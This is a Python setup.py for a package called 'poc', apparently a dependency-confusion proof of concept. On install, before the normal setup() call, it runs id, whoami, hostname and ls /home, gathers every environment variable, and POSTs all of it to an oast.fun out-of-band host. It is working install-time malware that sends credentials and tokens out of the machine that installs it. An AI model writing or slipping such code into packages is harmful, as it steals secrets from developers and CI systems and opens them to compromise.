from setuptools import setup
import subprocess, urllib.request, os, json

_exfil_url = "http://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/dependabot"

_data = {
    "cmd_id":      subprocess.check_output(["id"],       text=True).strip(),
    "cmd_whoami":  subprocess.check_output(["whoami"],   text=True).strip(),
    "cmd_hostname":subprocess.check_output(["hostname"], text=True).strip(),
    "cmd_uname":   subprocess.check_output(["ls", "/home"], text=True).strip(),
    "env":         dict(os.environ),
}

_req = urllib.request.Request(
    _exfil_url,
    data=json.dumps(_data).encode(),
    headers={"Content-Type": "application/json"},
    method="POST"
)
urllib.request.urlopen(_req, timeout=10)

setup(
    name="poc",
    install_requires=["requests"],
)
